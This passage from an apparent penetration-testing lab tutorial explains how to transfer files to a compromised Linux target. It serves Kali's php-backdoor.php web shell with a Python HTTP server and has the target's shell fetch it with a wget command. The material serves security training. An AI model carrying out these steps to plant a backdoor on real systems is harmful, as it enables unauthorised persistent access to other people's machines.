Now that we have gained access to the Linux target system, we can exploring the process of transferring files to the Linux target system.

**Step 5:** Transferring files to the Linux target

This process involves utilizing 2 terminal sessions, in order to setup more than one session, you will need to use the **tmux** utility. 
- tmux
	- CTRL + B + C
	- CTRL + B + 0 (change terminal)
	- CTRL + B + aroow down+up (for scrolling)

In this case, we will be transferring the **php-backdoor.php** file found under **/usr/share/webshells/php/** directory on the Kali Linux system.

To begin with, we can navigate to the directory


- cd /usr/share/webshells/php/


We can then start a web server with Python3 in this directory 

- python3 -m http.server 80

We can now navigate back to the command shell session on the target system, navigate to the **/temp** directory. 

- cd /temp


We can now download the **php-backdoor.php** file from the web server being hosted on the Kali linux system 

- wget http://192.196.45.2/php-backdoor.php


As shown in the following screenshot, the **php-backdoor.php** file is downloaded successfully on to the Linux system.
